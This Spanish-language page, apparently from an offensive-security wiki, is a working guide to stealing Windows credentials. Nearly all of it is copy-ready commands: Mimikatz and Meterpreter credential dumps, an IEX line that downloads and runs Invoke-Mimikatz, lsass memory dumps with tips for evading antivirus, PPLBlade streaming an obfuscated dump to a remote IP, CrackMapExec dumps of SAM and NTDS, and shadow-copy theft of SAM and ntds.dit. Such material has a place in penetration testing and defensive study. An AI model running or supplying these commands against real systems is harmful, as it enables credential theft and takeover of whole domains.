# Robando Credenciales de Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciales Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían evitar que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypass de AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectada por Defender.\
Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer** las **credenciales localmente** del volcado.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, esto se debe a que están **detectando** la cadena **"procdump.exe" y "lsass.exe"**. Por lo tanto, es **más sigiloso** pasar como un **argumento** el **PID** de lsass.exe a procdump **en lugar de** el **nombre lsass.exe.**

### Volcando lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll** que se encuentra en `C:\Windows\System32` es responsable de **volcar la memoria del proceso** en caso de un fallo. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para ser invocada usando `rundll32.exe`.\
No es relevante usar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso a volcar constituye el primer componente, la ubicación del archivo de volcado representa el segundo, y el tercer componente es estrictamente la palabra **full**. No existen opciones alternativas.\
Al analizar estos tres componentes, la DLL se encarga de crear el archivo de volcado y transferir la memoria del proceso especificado a este archivo.\
La utilización de **comsvcs.dll** es factible para volcar el proceso lsass, eliminando así la necesidad de subir y ejecutar procdump. Este método se describe en detalle en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

El siguiente comando se emplea para la ejecución:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcando lsass con el Administrador de tareas**

1. Haz clic derecho en la barra de tareas y selecciona Administrador de tareas
2. Haz clic en Más detalles
3. Busca el proceso "Local Security Authority Process" en la pestaña Procesos
4. Haz clic derecho en el proceso "Local Security Authority Process" y selecciona "Crear archivo de volcado".

### Volcando lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que admite la ofuscación de volcado de memoria y su transferencia en estaciones de trabajo remotas sin dejarlo en el disco.

**Funciones clave**:

1. Eludir la protección PPL
2. Ofuscar archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Subir el volcado de memoria con métodos de carga RAW y SMB sin dejarlo en el disco (volcado sin archivos)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Volcar hashes de SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Volcar secretos de LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el NTDS.dit del DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas de NTDS.dit desde el DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Muestra el atributo pwdLastSet para cada cuenta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Robando SAM y SYSTEM

Estos archivos deben estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de una manera regular** porque están protegidos.

### Desde el Registro

La forma más fácil de robar esos archivos es obtener una copia del registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos a tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puedes realizar copias de archivos protegidos utilizando este servicio. Necesitas ser Administrador.

#### Usando vssadmin

El binario vssadmin solo está disponible en versiones de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalmente, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, conteniendo datos cruciales sobre objetos de usuario, grupos y sus membresías. Es donde se almacenan los **hashes de contraseñas** para los usuarios del dominio. Este archivo es una base de datos de **Extensible Storage Engine (ESE)** y reside en **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro de esta base de datos, se mantienen tres tablas principales:

- **Tabla de Datos**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
- **Tabla de Enlaces**: Realiza un seguimiento de las relaciones, como las membresías de grupos.
- **Tabla SD**: Aquí se mantienen los **descriptores de seguridad** para cada objeto, asegurando la seguridad y el control de acceso para los objetos almacenados.

Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicada **dentro de la memoria de `lsass`** (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento al usar una **cache**).

#### Desencriptando los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Desencriptar la Clave de Encriptación de Contraseña (**PEK**) usando el **BOOTKEY** y **RC4**.
2. Desencriptar el **hash** usando **PEK** y **RC4**.
3. Desencriptar el **hash** usando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También podrías usar el [**volumen de copia de sombra**](./#stealing-sam-and-system) truco para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**dumps desde el registro o usa el volumen de copia de sombra**](./#stealing-sam-and-system) truco).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlos automáticamente** utilizando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **grandes archivos NTDS.dit** se recomienda extraerlo usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes usar el **módulo de metasploit**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también todos los objetos y sus atributos para una extracción de información adicional cuando el archivo NTDS.dit en bruto ya ha sido recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
El `SYSTEM` hive es opcional pero permite la descifrado de secretos (NT y LM hashes, credenciales suplementarias como contraseñas en texto claro, claves kerberos o de confianza, historiales de contraseñas NT y LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, banderas UAC, marca de tiempo para el último inicio de sesión y cambio de contraseña, descripción de cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...

## Lazagne

Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios software.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede usar para extraer credenciales de la memoria. Descárgala de: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraer credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo de: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecuta** y las contraseñas serán extraídas.

## Defenses

[**Aprende sobre algunas protecciones de credenciales aquí.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
